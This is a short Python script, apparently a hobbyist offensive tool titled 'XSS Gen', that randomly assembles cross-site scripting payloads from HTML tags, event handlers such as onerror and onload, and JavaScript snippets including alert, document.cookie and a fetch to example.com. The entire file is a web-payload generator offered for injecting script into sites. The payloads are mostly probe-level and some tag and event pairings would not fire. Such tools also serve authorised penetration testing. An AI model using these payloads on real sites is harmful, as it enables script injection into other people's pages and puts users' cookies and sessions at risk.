# !/usr/bin/python3 
# code by Mr - Dark 
# twiter @Mr_Dark55

import random
import string
import pyfiglet


#banner 
banner = pyfiglet.figlet_format("XSS Gen", font="starwars")
print(banner)


# List of common HTML tags
html_tags = ['div', 'img', 'script', 'iframe', 'svg', 'input', 'a', 'body', 'p', 'span']

# List of common JavaScript events
js_events = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onmouseout', 'ondblclick']

# List of common JavaScript code snippets
js_code_snippets = [
    'alert(1)', 
    'alert("XSS")', 
    'console.log("XSS")', 
    'document.cookie', 
    'document.write("XSS")',
    'fetch("http://example.com")'
]

# List of common CSS properties
css_properties = ['color', 'background-color', 'width', 'height', 'border']

# Function to generate random XSS payloads
def generate_random_xss_payloads(number_of_payloads):
    payloads = []
    for _ in range(number_of_payloads):
        tag = random.choice(html_tags)
        event = random.choice(js_events)
        code = random.choice(js_code_snippets)
        random_attr_value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        css_property = random.choice(css_properties)
        css_value = f'{random.randint(1, 100)}px'
        
        # Randomly decide to include a CSS property or another attribute
        if random.choice([True, False]):
            attribute = f'style="{css_property}:{css_value};"'
        else:
            attribute = f'{random.choice(string.ascii_lowercase)}="{random_attr_value}"'
        
        payload = f'<{tag} {event}="{code}" {attribute}>'
        payloads.append(payload)
    return payloads

# Request number of payloads from the user
number_of_payloads = int(input("Enter the number of payloads you want to generate: "))

# Generate the payloads
xss_payloads = generate_random_xss_payloads(number_of_payloads)

# Display the payloads to the user
for idx, payload in enumerate(xss_payloads, 1):
    print(f"Payload {idx}: {payload}")